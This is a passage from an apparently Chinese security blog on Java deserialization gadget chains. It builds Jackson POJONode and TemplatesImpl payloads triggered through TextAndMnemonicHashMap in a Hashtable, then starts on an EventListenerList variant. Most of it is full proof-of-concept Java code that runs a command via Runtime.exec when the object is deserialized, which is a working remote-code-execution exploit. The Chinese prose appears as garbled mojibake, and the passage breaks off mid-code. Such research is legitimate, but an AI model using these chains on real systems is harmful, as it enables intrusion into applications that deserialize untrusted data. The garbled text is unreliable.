java.lang.reflect.Field; import java.util.Hashtable; import java.util.Map; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception{ //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //ä¿®æ”¹ç±»æ–¹æ³• CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Map tHashMap1 = (Map) getObject(Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;)); Map tHashMap2 = (Map) getObject(Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;)); tHashMap1.put(node, \u0026#34;123\u0026#34;); tHashMap2.put(node, \u0026#34;12\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(tHashMap1,1); hashtable.put(tHashMap2,1); tHashMap1.put(node, null); tHashMap2.put(node, null); setFieldValue(tHashMap1, \u0026#34;loadFactor\u0026#34;, 0.75f); setFieldValue(tHashMap2, \u0026#34;loadFactor\u0026#34;, 0.75f); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static Object getObject(Class clazz) throws Exception{ Constructor constructor = clazz.getDeclaredConstructor(); constructor.setAccessible(true); return constructor.newInstance(); } public static void setFieldValue(Object obj, String key, Object val) throws Exception{ Field field = null; Class clazz = obj.getClass(); while (true){ try { field = clazz.getDeclaredField(key); break; } catch (NoSuchFieldException e){ clazz = clazz.getSuperclass();//éå¸¸æœ‰å¿…è¦ } } field.setAccessible(true); field.set(obj, val); } } è¿™æ ·å°±å¯ä»¥å®Œå…¨æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œå¹¶ä¸”åœ¨æ§åˆ¶å°ä¼šæŠ¥é”™ï¼Œç®€å•çœ‹ä¸€ä¸‹ç¡®å®æ˜¯æŒ‰ç…§é¢„æœŸçš„é“¾å­èµ°çš„ï¼Œé‡ç‚¹çš„éœ€è¦ç†è§£çš„æ˜¯å¦‚ä¸‹çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 Map tHashMap1 = (Map) getObject(Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;)); Map tHashMap2 = (Map) getObject(Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;)); tHashMap1.put(node, \u0026#34;123\u0026#34;); tHashMap2.put(node, \u0026#34;12\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(tHashMap1,1); hashtable.put(tHashMap2,1); tHashMap1.put(node, null); tHashMap2.put(node, null); setFieldValue(tHashMap1, \u0026#34;loadFactor\u0026#34;, 0.75f); setFieldValue(tHashMap2, \u0026#34;loadFactor\u0026#34;, 0.75f); getObject()æ˜¯è‡ªå®šä¹‰çš„è·å–æ„é€ å™¨ç„¶åè¿›è¡Œå®ä¾‹åŒ–çš„æ“ä½œï¼Œé‡ç‚¹æ˜¯åé¢çš„å†…å®¹ï¼Œä¸ºä»€ä¹ˆè¦å†æ¬¡è°ƒç”¨put()æ–¹æ³•å°†valueå€¼å˜æˆnullï¼Œç®€å•ä»ä»£ç å±‚é¢æ¥ç†è§£ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 2 tHashMap1.put(node, \u0026#34;123\u0026#34;); tHashMap2.put(node, \u0026#34;12\u0026#34;); è¿™é‡Œçš„ä¸¤ä¸ªç±»æ”¾å…¥çš„é”®å€¼å¯¹çš„å€¼ä¸åŒï¼Œé‚£ä¹ˆå¯¹äºåç»­çš„Hashtableè°ƒç”¨æ—¶put()æ–¹æ³•æ—¶çš„hashå€¼è‚¯å®šä¸åŒï¼Œä¹Ÿå°±ä¸ä¼šè°ƒç”¨equals()æ–¹æ³•æ¥è¿›è¡Œæ¯”è¾ƒï¼Œä»è€ŒæˆåŠŸæ”¾å…¥äº†é”®å€¼å¯¹ï¼Œé‚£ä¹ˆåé¢ä¸¤ä¸ªâ€œtHashMapâ€œåˆå†æ¬¡è°ƒç”¨put()æ–¹æ³•æ˜¯ä¸ºäº†è¿›è¡Œä¸€ä¸ªé”®å€¼å¯¹çš„å€¼çš„æ›´æ–°æ“ä½œï¼Œæ‰€ä»¥åœ¨ååºåˆ—åŒ–æ—¶çš„åˆ¤æ–­çš„hashå€¼å°±ä¼šç›¸åŒäº†ï¼Œä»è€Œå¯ä»¥æˆåŠŸè¿›è¡Œä¸€æ¬¡è°ƒç”¨é“¾çš„æ‰§è¡Œï¼Ÿä»æ§åˆ¶å°çš„æŠ¥é”™ç¡®å®æ˜¯å¯¹çš„ï¼Œä½†æ˜¯è¿™é‡Œå°±ä¸ä¼šåœ¨getKey()æ—¶æŠ¥é”™å—ï¼Ÿå¦‚æœä»è¿™ä¸ªæ–¹é¢æ¥çœ‹çš„è¯ï¼Œä¸»è¦çš„ä¸åŒç‚¹å°±æ˜¯åœ¨å¦‚ä¸‹ä»£ç ï¼š\n1 2 setFieldValue(tHashMap1, \u0026#34;loadFactor\u0026#34;, 0.75f); setFieldValue(tHashMap2, \u0026#34;loadFactor\u0026#34;, 0.75f); è¿™é‡Œæ˜¯å¯¹HashMapç±»ä¸­çš„loadFactorå˜é‡è¿›è¡Œäº†ä¿®æ”¹ï¼Œè¿™é‡Œçš„setFieldValue()æ–¹æ³•å®šä¹‰ä¹Ÿå€¼å¾—å­¦ä¹ ï¼Œå¯ä»¥è·å–åˆ°çˆ¶ç±»ä¸­çš„å˜é‡å¹¶è¿›è¡Œä¿®æ”¹ï¼Œæ‰©å¤§äº†åˆ©ç”¨é¢ã€‚æ‰€ä»¥ä¸ºä»€ä¹ˆéœ€è¦å¯¹è¿™é‡Œè¿›è¡Œä¿®æ”¹å‘¢ï¼Œå°è¯•ä¸€ä¸‹å°†è¿™é‡Œæ”¹æˆæ²¡æœ‰è¿™ä¸ªï¼Œå‘ç°è¿˜æ˜¯æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼ï¼ˆä½†æ˜¯åŸæ–‡ç« çš„åŸæ ¼å¼ç¡®å®éœ€è¦ï¼Œè¿™å°±ä¸HashMapååºåˆ—åŒ–æ—¶çš„é—®é¢˜ç›¸å…³äº†ï¼Œè¿™é‡Œä¸å¤šè¯´ï¼‰è°ƒè¯•äº†ä¸€ä¸‹è¿™é‡Œçš„è¿‡ç¨‹ï¼Œç†è§£åˆ°äº†ä¸ºä»€ä¹ˆï¼Œè¿™é‡Œå°±ç®€å•è¯´è¯´å§ï¼Œåœ¨å‰é¢çš„ä»£ç æ„é€ ä¸­ï¼Œæˆ‘ä¸€ç›´å¿˜è®°äº†ä¸€ä¸ªç‚¹ï¼š\nè¿™é‡Œéœ€è¦valueçš„å€¼ä¸ºnullæ‰èƒ½æˆåŠŸè°ƒç”¨è¿™ä¸ªtoString()æ–¹æ³•ï¼Œå¹¶ä¸”è™½ç„¶ååºåˆ—åŒ–æ—¶åŒæ ·æœ‰è¿™ä¸ªå¼‚å¸¸é”™è¯¯ï¼Œä½†æ˜¯ä»å‚æ•°çœ‹ï¼Œè¿™ä¸ªå€¼ä»£è¡¨çš„è¿˜æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç±»ï¼Œä¸‹é¢ä»å‰é¢çš„æˆ‘è‡ªå·±æ„é€ çš„ä»£ç è¯´æ˜ä¸€ä¸‹ï¼Œè´´ä¸€ä¸‹å‰é¢â€œè‡ªè®¤ä¸ºæ˜¯è‡ªåŠ¨è°ƒç”¨toString()æ–¹æ³•é€ æˆé”™è¯¯â€œçš„ç‚¹çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //ä¿®æ”¹ç±»æ–¹æ³• CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //ä¹Ÿå¯ä»¥ç›´æ¥åˆ å»è¿™ä¸ªç±» ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Constructor constructor = Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Map text = (Map)constructor.newInstance(); text.put(node,\u0026#34;1\u0026#34;); HashMap hashMap1 = new HashMap(); hashMap1.put(node,\u0026#34;1\u0026#34;); Hashtable table = new Hashtable(); table.put(hashMap1,\u0026#34;1\u0026#34;); table.put(text,\u0026#34;1\u0026#34;); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è¿™é‡Œå¯ä»¥åœ¨TextAndMnemonicHashMapç±»çš„get()æ–¹æ³•åŠ ä¸€ä¸ªæ–­ç‚¹ï¼š\nè°ƒè¯•åŸå…ˆçš„ä»£ç ï¼Œå‘ç°åœ¨getKey()æ–¹æ³•è¿˜æ˜¯æŠ¥å¼‚å¸¸é”™è¯¯ï¼Œä½†æ˜¯ç¡®å®ä¼šè°ƒç”¨åˆ°è¿™é‡Œï¼Œå¹¶ä¸”çœ‹æ­¤æ—¶çš„keyæ‰€ä»£è¡¨çš„å€¼ï¼š\nå°±æ˜¯æ­£å¸¸çš„POJONodeç±»ï¼Œéƒ½æ˜¯è‡ªå·±æ„é€ çš„ï¼Œç„¶åæˆåŠŸè°ƒç”¨åˆ°äº†TextAndMnemonicHashMapç±»çš„get()æ–¹æ³•ï¼š\nä»è¿™ä¸ªget()æ–¹æ³•çš„é€»è¾‘ï¼Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¼šå…ˆè·å–åˆ°å¯¹åº”keyçš„valueï¼Œåªæœ‰è¿™é‡Œçš„valueä¸ºnullï¼Œæ‰èƒ½è°ƒç”¨åˆ°toString()æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯éœ€è¦TextAndMnemonicHashMapç±»æ‰€å¯¹åº”çš„\u0026quot;HashMap\u0026quot;ç±»çš„é”®å€¼å¯¹çš„å€¼ä¸ºnullï¼ŒåŸºäºä¸Šé¢çš„æƒ…å†µï¼Œå¯ä»¥ç®€å•æ”¹ä¸€ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //ä¿®æ”¹ç±»æ–¹æ³• CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //ä¹Ÿå¯ä»¥ç›´æ¥åˆ å»è¿™ä¸ªç±» ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Constructor constructor = Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Map text = (Map)constructor.newInstance(); text.put(node,null); HashMap hashMap1 = new HashMap(); hashMap1.put(node,null); Hashtable table = new Hashtable(); table.put(hashMap1,\u0026#34;1\u0026#34;); table.put(text,\u0026#34;1\u0026#34;); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } è¿™æ ·å°±å¯ä»¥ç¨³å®šåœ¨åºåˆ—åŒ–å‰æŒ‰ç…§é¢„æœŸæˆåŠŸè°ƒç”¨ä¸€æ¬¡è°ƒç”¨é“¾ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºä¸ºäº†ä¿è¯hashå€¼ç›¸åŒï¼Œè¿™é‡Œè®©hashMap1çš„valueä¹Ÿæ”¹æˆäº†nullï¼Œé‚£ä¹ˆæ­¤æ—¶åœ¨AbstractMapç±»çš„equals()æ–¹æ³•è°ƒç”¨get()æ–¹æ³•ä¹Ÿæœ‰æ”¹å˜ï¼š\nç”±äºå°†valueæ”¹æˆäº†nullï¼Œæ‰€ä»¥è¿™é‡Œvalueè¿”å›å€¼ä¹Ÿæ˜¯nullï¼Œè¿›å…¥äº†ç¬¬ä¸€ä¸ªifæ¡ä»¶ï¼Œè¿˜æ˜¯è°ƒç”¨åˆ°äº†ä¸€æ¬¡get()æ–¹æ³•ï¼Œåé¢å°±éƒ½æ˜¯é¢„æœŸçš„äº†ã€‚\né‚£ä¹ˆååºåˆ—åŒ–å¦‚ä½•ç»•è¿‡å‘¢ï¼Œå‰é¢ç»™å‡ºçš„POCå·²ç»å¯ä»¥è¯´æ˜äº†ï¼Œåœ¨Hashtableæ”¾å…¥å€¼æ—¶ç›´æ¥è®©hashå€¼ä¸åŒä»è€Œå¯ä»¥æ­£å¸¸æ”¾å…¥ï¼Œåé¢å†è°ƒç”¨put()æ–¹æ³•æ¥è¿›è¡Œä¸€æ¬¡æ›´æ–°å€¼çš„æ“ä½œï¼Œæ‰€ä»¥æœ€åçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { //ä½¿ç”¨javassistå®šä¹‰æ¶æ„ä»£ç  ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; //ä¿®æ”¹ç±»æ–¹æ³• CtClass ctClass = classPool.getCtClass(\u0026#34;com.fasterxml.jackson.databind.node.BaseJsonNode\u0026#34;); CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;writeReplace\u0026#34;); //ä¹Ÿå¯ä»¥ç›´æ¥åˆ å»è¿™ä¸ªç±» ctClass.removeMethod(ctMethod); ctClass.toClass(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); POJONode node = new POJONode(templates); Constructor constructor = Class.forName(\u0026#34;javax.swing.UIDefaults$TextAndMnemonicHashMap\u0026#34;).getDeclaredConstructor(); constructor.setAccessible(true); Map text0 = (Map)constructor.newInstance(); text0.put(node,\u0026#34;aa1\u0026#34;); Map text1 = (Map)constructor.newInstance(); text1.put(node,\u0026#34;aa2\u0026#34;); Hashtable table = new Hashtable(); table.put(text1,\u0026#34;1\u0026#34;); table.put(text0,\u0026#34;1\u0026#34;); text0.put(node,null); text1.put(node,null); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(table); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } ç»æµ‹è¯•å‘ç°å¦‚æœæ˜¯æƒ³ä½¿ç”¨HashMapå’ŒTextAndMnemonicHashMaplä½œä¸ºHashtableä¸­çš„ä¸¤ä¸ªé”®ï¼Œåœ¨Hashtableçš„ååºåˆ—åŒ–æ—¶ï¼Œå…ˆåé¡ºåºä¼šå‘ç”Ÿæ”¹å˜ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘åœ¨JD7u21åŸç”Ÿé“¾æè¿‡ï¼Œè¿™é‡Œä¸å†å¤šè¯´ï¼Œä½¿ç”¨ä¸Šé¢çš„ä»£ç å°±è¡Œäº†ã€‚\næ€»ç»“ï¼š\nå¾—æŠ“ä¸€ä¸‹é‡ç‚¹å‘€ï¼Œå°±é‚£ä¸€ä¸ªç‚¹ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒå…³é”®çš„ä¸€ç‚¹ï¼Œæ„é€ ä»£ç æ—¶æ²¡æ³¨æ„åˆ°ã€‚è¿˜æ˜¯å¡äº†ä¸€æ®µæ—¶é—´ã€‚ EventListenerList è¿™ä¸ªç±»ä½äºjavax.swing.event.EventListenerListï¼ŒåŒæ ·æ˜¯å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„getteræ–¹æ³•ï¼Œå…ˆæ¥è·Ÿè¿›è¿™ä¸ªç±»çš„readObject()æ–¹æ³•ï¼š\nç„¶åè·Ÿè¿›è¿™é‡Œçš„add()æ–¹æ³•ï¼š\nå½“lä¸æ˜¯tçš„ç±»æˆ–æ¥å£çš„å®ä¾‹åŒ–æ—¶ï¼Œè¿™é‡Œå°±ä¼šè¿›å…¥æŠ›å‡ºå¼‚å¸¸çš„æ“ä½œï¼Œä½†æ˜¯è¿™é‡Œçš„æŠ›å‡ºå¼‚å¸¸çš„æ“ä½œæ˜¯è¿›è¡Œäº†ä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥çš„æ“ä½œï¼Œæ‰€ä»¥åªè¦æ§åˆ¶å¾—å¥½lï¼Œé‚£ä¹ˆä¹…å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„toString()æ–¹æ³•ã€‚å†å›è¿‡å»çœ‹å‚æ•°ä¼ é€’çš„è¦æ±‚ï¼š\nè¿™é‡Œçš„forName()æ–¹æ³•ï¼Œæ­£å¥½æ˜¯å½“æ—¶å­¦åå°„æ—¶è¯´æ˜äº†çš„ï¼Œè™½ç„¶æœ‰å‡ ä¸ªå‚æ•°ä¼ é€’ï¼Œä½†æ˜¯å…¶å®å°±æ˜¯ç›¸å½“äºè°ƒç”¨çš„forName()ï¼Œè¿™é‡Œçš„clå°±æ˜¯ä¸€ä¸ªç±»åŠ è½½å™¨ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥è·å–åˆ°ä¸€ä¸ªClasså¯¹è±¡ï¼Œç„¶åçœ‹è¿™é‡Œçš„lï¼Œå¯ä»¥çŸ¥é“æ˜¯ä»æ•°æ®è¯»å‡ºå¹¶ä¸”æœ‰ä¸€ä¸ªå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä¹Ÿå°±æ˜¯è¦æ±‚å…¶ä¸ºä¸€ä¸ªä¸EventListeneræœ‰å…³è”çš„å¯¹è±¡ã€‚å†çœ‹ä¸€ä¸‹EventListenerListç±»çš„writeObject()æ–¹æ³•ï¼š\nå¤§æ¦‚å°±å¯ä»¥çŸ¥é“è¿™é‡Œçš„åºåˆ—åŒ–æ‰€éœ€çš„å˜é‡äº†ï¼Œå¹¶ä¸”å¯ä»¥å’Œååºåˆ—åŒ–å¯¹åº”èµ·æ¥ï¼Œæœ‰åœ¨ååºåˆ—åŒ–åˆ©ç”¨çš„å¯èƒ½æ€§ã€‚\né‚£ä¹ˆåœ¨è¿™é‡Œå¯ä»¥åˆ©ç”¨åˆ°çš„æ˜¯javax.swing.undo.UndoManagerç±»ï¼Œå®ƒçš„æ¥å£UndoableEditListeneræ˜¯java.util.EventListenerçš„å­ç±»ï¼Œè·Ÿè¿›è¿™ä¸ªç±»çš„toString()æ–¹æ³•ï¼š\nè¿™é‡Œè°ƒç”¨äº†çˆ¶ç±»çš„toString()æ–¹æ³•ï¼Œè¿˜è°ƒç”¨äº†ä¸¤ä¸ªå˜é‡ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå˜é‡éƒ½å®šä¹‰ä¸ºintç±»å‹ï¼š\n1 2 int indexOfNextAdd; int limit; æ— æ³•åˆ©ç”¨ï¼Œç»§ç»­è·Ÿè¿›çˆ¶ç±»CompoundEditçš„toString()æ–¹æ³•ï¼š\nçœ‹æ­¤æ—¶è¿™ä¸¤ä¸ªå˜é‡çš„å®šä¹‰ï¼š\nå¯ä»¥çœ‹åˆ°inProgressæ˜¯å¸ƒå°”å‹ï¼Œè€Œeditsåœ¨å®ä¾‹åŒ–æ—¶ä¼šèµ‹å€¼ä¸ºä¸€ä¸ªVectorç±»å®ä¾‹ï¼Œå¹¶ä¸”UndoManagerç±»å®ä¾‹åŒ–æ—¶ä¹…å¯ä»¥ä¿è¯è¿™ä¸ªçˆ¶ç±»ä¹Ÿå®ä¾‹åŒ–ï¼Œå†çœ‹CompoundEdiç±»çš„toString()æ–¹æ³•ï¼ŒåŒæ ·æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥çš„æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥è°ƒç”¨åˆ°Vectorç±»çš„toString()æ–¹æ³•ï¼š\nå†è·Ÿè¿›çˆ¶ç±»AbstractCollectionçš„toString()æ–¹æ³•ï¼š\nè·Ÿè¿›è¿™é‡Œçš„append()æ–¹æ³•ï¼š\nè¿™é‡Œçš„value()æ–¹æ³•å¯ä»¥è°ƒç”¨åˆ°ä»»æ„ç±»çš„toString()æ–¹æ³•ï¼š\nä¸ªäººè§‰å¾—åˆ©ç”¨ç‚¹æ˜¯å‰é¢å›¾ä¸­ç”¨æ¡†æ ‡å‡ºæ¥çš„appendæ–¹æ³•ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•è¿›è¡Œæ„é€ äº†ï¼Œå°±ç®€å•è¯´æ˜å‡ ä¸ªç‚¹ï¼š\nEventListenerListæ— æ„é€ æ–¹æ³•ï¼Œéœ€è¦åˆ©ç”¨åˆ°Object[]ç±»å‹çš„listenerListå˜é‡ï¼Œåå°„ä¿®æ”¹å³å¯ï¼Œä¸€å®šè¦çœ‹æ‡‚writeObject()çš„é€»è¾‘ï¼Œè¿™æ ·æ‰èƒ½æ„é€ å‡ºæ¥ã€‚\nå¦å¤–çš„ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹å°±æ˜¯å¦‚ä¸‹ï¼š\næ€ä¹ˆæ§åˆ¶è¿™ä¸ªeä¸ºä»»æ„ç±»å‹ã€‚é‡ç‚¹å°±åœ¨äºè¿™ä¸ªiterator()æ–¹æ³•ï¼Œå†å›æƒ³ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼Œåˆ°è¿™ä¸€æ­¥çš„toString()æ–¹æ³•ï¼Œå·²ç»æ˜¯å’ŒVectorç±»ç›¸å…³äº†ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„selfä¸ºVectorç±»å®ä¾‹ï¼Œå¹¶ä¸”ç®€å•æ„é€ ä»£ç è°ƒè¯•ä¹Ÿæ˜¯å¦‚é¢„æœŸçš„ï¼Œè€Œåœ¨Vectorç±»çš„iterator()æ–¹æ³•ï¼Œæ˜¯è¿”å›çš„ä¸€ä¸ªå†…éƒ¨ç±»Itrå®ä¾‹ï¼š\né‡Œé¢å°±å®šä¹‰äº†ä¸€äº›ç®€å•çš„next()å‡½æ•°ç”¨äºè¿­ä»£ï¼Œåœ¨åŸå…ˆçš„toString()æ–¹æ³•ä¸­ï¼Œå¯ä»¥çŸ¥é“æ˜¯ï¼Œè·Ÿè¿›next()å‡½æ•°æœ€åè¿”å›çš„elementDataï¼š\nå…¶å®å°±æ˜¯è¿”å›å­˜å‚¨åœ¨è¿™ä¸ªå½“ä¸­çš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šæ˜¯è¦å°†nodeæ”¾è¿›è¿™ä¸ªæ•°ç»„å½“ä¸­çš„ã€‚å¯¹äºè¿™ä¸ªelementDataæ•°ç»„ï¼ŒVectorç±»å®šä¹‰äº†å¾ˆå¤šæ–¹æ³•æ¥è¿›è¡Œæ“ä½œï¼Œå¦‚insertElementAtï¼š\nç­‰ã€‚\næ‰€ä»¥è¿™ä¹Ÿæ˜¯å¯ä»¥æ“ä½œçš„ï¼Œä½†æ˜¯è¦æ€ä¹ˆå°†è¿™ä¸ªè®¾è®¡å¥½çš„Vectorç±»æ’å…¥è¿›å»å‘¢ï¼Ÿåœ¨åŸæœ¬çš„åˆ©ç”¨é“¾ä¸­ï¼Œæ˜¯ç›´æ¥å°†Vectorå®ä¾‹åŒ–çš„ï¼š\nè¿˜æ˜¯åå°„è¿›è¡Œä¿®æ”¹ï¼Œå…·ä½“çœ‹ä¸‹é¢çš„POCå³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 package jackson; import com.fasterxml.jackson.databind.node.POJONode; import javassist.*; import 